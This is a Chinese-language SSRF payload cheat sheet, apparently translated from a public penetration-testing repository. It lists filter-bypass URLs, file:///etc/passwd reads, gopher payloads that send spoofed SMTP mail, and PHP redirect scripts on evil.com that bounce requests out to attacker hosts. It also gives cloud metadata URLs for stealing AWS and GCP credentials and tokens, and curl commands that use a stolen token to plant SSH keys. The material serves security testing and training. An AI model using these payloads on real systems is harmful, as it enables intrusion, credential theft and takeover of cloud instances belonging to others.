# 服务端请求伪造-SSRF

> 服务器端请求伪造-SSRF是一个漏洞，攻击者强制服务器代表它们执行请求。

## Summary

* [Tools](#tools)
* [Payloads with localhost](#payloads-with-localhost)
* [Bypassing filters](#bypassing-filters)
  * [Bypass using HTTPS](#bypass-using-https)
  * [Bypass localhost with [::]](#bypass-localhost-with----)
  * [Bypass localhost with a domain redirection](#bypass-localhost-with-a-domain-redirection)
  * [Bypass localhost with CIDR](#bypass-localhost-with-cidr)
  * [Bypass using a decimal IP location](#bypass-using-a-decimal-ip-location)
  * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6-ipv4-address-embedding)
  * [Bypass using malformed urls](#bypass-using-malformed-urls)
  * [Bypass using rare address](#bypass-using-rare-address)
  * [Bypass using bash variables](#bypass-using-bash-variables)
  * [Bypass using tricks combination](#bypass-using-tricks-combination)
  * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
  * [Bypass filter_var() php function](#bypass-filter-var-php-function)
  * [Bypass against a weak parser](#bypass-against-a-weak-parser)
* [SSRF exploitation via URL Scheme](#ssrf-exploitation-via-url-scheme)
  * [file://](#file)
  * [http://](#http)
  * [dict://](#dict)
  * [sftp://](#sftp)
  * [tftp://](#tftp)
  * [ldap://](#ldap)
  * [gopher://](#gopher)
* [SSRF to XSS](#ssrf-to-xss)
* [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
  * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
  * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
  * [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)
  * [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
  * [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)
  * [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)
  * [SSRF URL for Azure](#ssrf-url-for-azure)
  * [SSRF URL for OpenStack/RackSpace](#ssrf-url-for-openstackrackspace)
  * [SSRF URL for HP Helion](#ssrf-url-for-hp-helion)
  * [SSRF URL for Oracle Cloud](#ssrf-url-for-oracle-cloud)
  * [SSRF URL for Kubernetes ETCD](#ssrf-url-for-kubernetes-etcd)
  * [SSRF URL for Alibaba](#ssrf-url-for-alibaba)
  * [SSRF URL for Docker](#ssrf-url-for-docker)
  * [SSRF URL for Rancher](#ssrf-url-for-rancher)

## Tools

- [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
- [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)

## 本地Payloads 

Basic SSRF v1

```powershell
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
```

Basic SSRF - Alternative version

```powershell
http://localhost:80
http://localhost:443
http://localhost:22
```

使用重定向的高级攻击

```powershell
1. 使用DNS记录创建一个指向192.168.0.1的子域，例如:ssrf.example.com
2. 启动SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
vulnerable.com将获取将重定向到192.168.0.1的YOUR_SERVER_IP
```

使用type=url的高级攻击

```powershell
将“type=file”更改为“type=url”
在文本框中粘贴URL，然后回车
使用此漏洞，用户可以从任何图像URL =触发SSRF上传图像
```

## Bypassing filters

### 使用 HTTPS 绕过

```powershell
https://127.0.0.1/
https://localhost/
```

### 使用 [::] 绕过本地主机

```powershell
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

```powershell
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
```

### 使用域名重定向绕过本地主机

```powershell
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
```

The service nip.io is awesome for that, it will convert any ip address as a dns.

```powershell
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
```

### 使用CIDR绕过本地主机

It's a /8

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### 使用十进制的IP地址绕过

```powershell
http://0177.0.0.1/
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
```

### 绕过使用IPv6/IPv4地址嵌入

[IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

```powershell
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### 绕过使用格式错误的url

```powershell
localhost:+11211aaa
localhost:00011211aaaa
```

### 使稀有地址绕过

您可以通过删除0来缩短IP地址

```powershell
http://0/
http://127.1
http://127.0.1
```

### 使用bash变量绕过

(curl only)

```powershell
curl -v "http://evil$google.com"
$google = ""
```

### 使用技巧相结合的绕过

```powershell
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
```

### 使用封闭的字母数字绕过

[@EdOverflow](https://twitter.com/EdOverflow)

```powershell
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com

List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

### 绕过filter_var() php函数

```powershell
0://evil.com:80;http://google.com:80/ 
```

### 绕过弱解析器

by Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_Parser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)


## SSRF exploitation via URL Scheme

### 文件 

允许攻击者在服务器上获取文件的内容

```powershell
file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
ssrf.php?url=file:///etc/passwd
```

### HTTP

允许攻击者从web获取任何内容，也可以用来扫描端口

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true)

下面的URL方案可用于探测网络

### Dict

DICT URL模式用于引用使用DICT协议的定义或单词列表:

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### SFTP 

用于通过安全外壳进行安全文件传输的网络协议

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

### TFTP

Trivial File Transfer Protocol. 工作在UDP

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### LDAP

Lightweight Directory Access Protocol. 它是在IP网络上用于管理和访问分布式目录信息服务的应用协议。

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### Gopher

```powershell
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a

will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH

You didn't say the magic word !


.
QUIT
```

#### Gopher HTTP

```powershell
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
```

#### Gopher SMTP - Back connect to 1337

```php
Content of evil.com/redirect.php:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>

Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```

#### Gopher SMTP - send a mail

```php
Content of evil.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

## SSRF to XSS 

by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)

```bash
http://brutelogic.com.br/poc.svg -> simple alert
https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf

https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
```

## SSRF URL for Cloud Instances

### AWS Bucket 的  SSRF URL

[Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
这条路径很有意思 `http://169.254.169.254`

```powershell
Always here : /latest/meta-data/{hostname,public-ipv4,...}
User data (startup script for auto-scaling) : /latest/user-data
Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
```

DNS 记录

```powershell
http://169.254.169.254
http://metadata.nicob.net/
http://169.254.169.254.xip.io/
http://1ynrnhl.xip.io/
http://www.owasp.org.1ynrnhl.xip.io/
```

HTTP 重定向

```powershell
Static:http://nicob.net/redir6a
Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
```

替换IP编码

```powershell
http://425.510.425.510/ Dotted decimal with overflow
http://2852039166/ Dotless decimal
http://7147006462/ Dotless decimal with overflow
http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
http://0xA9FEA9FE/ Dotless hexadecimal
http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
http://0251.0376.0251.0376/ Dotted octal
http://0251.00376.000251.0000376/ Dotted octal with padding
```

需要包含更多url

```powershell
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
```

E.g: Jira SSRF 导致AWS信息泄露 -

 `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`

E.g2: Flaws 挑战- `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`


### AWS Elastic Beanstalk 的 SSRF URL

从 API 检索 `accountId` 和`region` 。

```powershell
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

然后从 API 检索 `AccessKeyId`, `SecretAccessKey`和 `Token` 。

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

![notsosecureblog-awskey](https://www.notsosecure.com/wp-content/uploads/2019/02/aws-cli.jpg)

然后使用凭证`aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.


### AWS Lambda 的 SSRF URL

AWS Lambda为自定义运行时提供一个HTTP API，用于从Lambda接收调用事件并在Lambda执行环境中发回响应数据。

```powershell
http://localhost:9001/2018-06-01/runtime/invocation/next
$ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
```

Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next

### 谷歌云的 SSRF URL

需要头 "Metadata-Flavor: Google" 或 "X-Google-Metadata-Request: True"

```powershell
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

谷歌允许递归提取

```powershell
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

测试版不需要报头atm (thanks Mathias Karlsson @avlidienbrunn)

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

取出引人注目的文件:

- SSH 公钥 : 

  `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`

- 获取访问令牌 :

   `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`

- Kubernetes 键 : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`

#### 添加SSH密钥

提取令牌

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

查看令牌的范围

```powershell
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

现在按SSH键。

```powershell
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

### SSRF URL for Digital Ocean

文档可以在 `https://developers.digitalocean.com/documentation/metadata/`

```powershell
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

All in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```

### SSRF URL for Packetcloud

文档可以在 `https://metadata.packet.net/userdata`

### SSRF URL for Azure

有限，也许更多?

`https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`

```powershell
http://169.254.169.254/metadata/v1/maintenance
```

2017年4月更新，Azure有更多支持;需要标题“Metadata: true”

 `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

### SSRF URL for OpenStack/RackSpace

(header required? unknown)

```powershell
http://169.254.169.254/openstack
```

### SSRF URL for HP Helion

(header required? unknown)

```powershell
http://169.254.169.254/2009-04-04/meta-data/ 
```

### SSRF URL for Oracle Cloud

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

### SSRF URL for Alibaba

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

### SSRF URL for Kubernetes ETCD

可以包含API密钥和内部ip和端口

```powershell
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

### SSRF URL for Docker

```powershell
http://127.0.0.1:2375/v1.24/containers/json

Simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

### SSRF URL for Rancher

```powershell
curl http://rancher-metadata/<version>/<path>
```

更多信息：https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/


## References

- [Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - 2017-12-13](https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)
- [ESEA Server-Side Request Forgery and Querying AWS Meta Data](http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/) by Brett Buerhaus
- [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857)
- [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
- [SSRF in proxy.duckduckgo.com](https://hackerone.com/reports/358119)
- [Blind SSRF on errors.hackerone.net](https://hackerone.com/reports/374737)
- [SSRF on *shopifycloud.com](https://hackerone.com/reports/382612)
- [Hackerone - How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Awesome URL abuse for SSRF by @orange_8361 #BHUSA](https://twitter.com/albinowax/status/890725759861403648)
- [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai](https://www.youtube.com/watch?v=D1S-G8rJrEk)
- [SSRF Tips - xl7dev](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
- [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
- [Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat](https://www.dailysecurity.fr/server-side-request-forgery/)
- [AppSecEU15 Server side browsing considered harmful - @Agarri](http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
- [Enclosed alphanumerics - @EdOverflow](https://twitter.com/EdOverflow)
- [Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity](http://www.sxcurity.pro/2017/12/17/hackertarget/)
- [PHP SSRF @secjuice](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
- [How I convert SSRF to xss in a ssrf vulnerable Jira](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
- [Piercing the Veil: Server Side Request Forgery to NIPRNet access](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
- [Hacker101 SSRF](https://www.youtube.com/watch?v=66ni2BTIjS8)
- [SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
- [SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
- [SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst](https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
- [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
- [Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure](https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)
- [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019](https://github.com/allanlw/svg-cheatsheet)